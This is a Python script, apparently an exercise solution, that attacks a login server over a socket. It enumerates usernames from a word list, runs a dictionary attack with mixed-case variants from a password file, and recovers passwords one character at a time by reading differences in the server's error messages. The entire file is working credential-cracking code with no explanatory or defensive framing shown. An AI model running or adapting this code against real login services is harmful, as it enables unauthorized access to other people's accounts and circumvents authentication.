import sys
import socket
import string
import itertools
import json

alphabet_lower = string.ascii_lowercase
alphabet_upper = string.ascii_uppercase
numbers = [str(x) for x in range(0, 10)]
max_attempts = 1_000_000
allowed_tokens = list(itertools.chain(alphabet_upper, alphabet_lower, numbers))
path_to_file = "passwords.txt"
buffer = 1024


def get_bruteforce_password():
    for i in range(1, len(allowed_tokens)):
        for p_word in itertools.product(allowed_tokens, repeat=i):
            yield ''.join(p_word)


def get_password_letters():
    for i in range(0, len(allowed_tokens)):
        yield allowed_tokens[i]


def try_with_login_empty_pass(login, sock):
    pass_login = {"login": f"{login}", "password": ""}
    sock.send(json.dumps(pass_login).encode())
    resp = json.loads(sock.recv(buffer).decode())
    if resp["result"] == "Wrong password!":
        return True
    else:
        return False


def try_different_passwords(login, sock):
    password_letter_generator = get_password_letters()
    password = next(password_letter_generator)
    while True:
        pass_login = {"login": f"{login}", "password": f"{password}"}
        sock.send(json.dumps(pass_login).encode())
        resp = json.loads(sock.recv(buffer).decode())
        if resp["result"] == "Exception happened during login":
            password_letter_generator = get_password_letters()
            password = f"{password}{next(password_letter_generator)}"
        elif resp["result"] == "Wrong password!":
            next_letter = next(password_letter_generator)
            password = password[:-1]
            password = f"{password}{next_letter}"
        else:
            print(json.dumps(pass_login))
            break


def generate_mixed_case_passwords(word):
    tuples = zip(word.lower(), word.upper())
    for p in itertools.product(*tuples):
        yield ''.join(p)


def get_line_generator(path):
    with open(path, 'r', encoding='utf8') as f:
        for line in f:
            yield line.strip()


def generate_password():
    line_gen = get_line_generator(path_to_file)
    for line in line_gen:
        if line.isnumeric():
            yield line
        else:
            pass_gen = generate_mixed_case_passwords(line)
            for p in pass_gen:
                yield p


def connect_stage4():
    args = sys.argv
    ip_addr = args[1]
    port = int(args[2])
    with socket.socket() as sock:
        sock.connect((ip_addr, port))
        login_generator = get_line_generator("logins.txt")
        login = ""
        for log in login_generator:
            if try_with_login_empty_pass(log, sock):
                login = log
                break
        try_different_passwords(login, sock)


def connect_stage3():
    args = sys.argv
    ip_addr = args[1]
    port = int(args[2])

    with socket.socket() as sock:
        sock.connect((ip_addr, port))
        password_generator = generate_password()
        for message in password_generator:
            encoded_message = message.encode()
            sock.send(encoded_message)
            response = sock.recv(buffer)
            decoded = response.decode()
            if decoded == "Connection success!":
                print(message)
                break


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    connect_stage4()
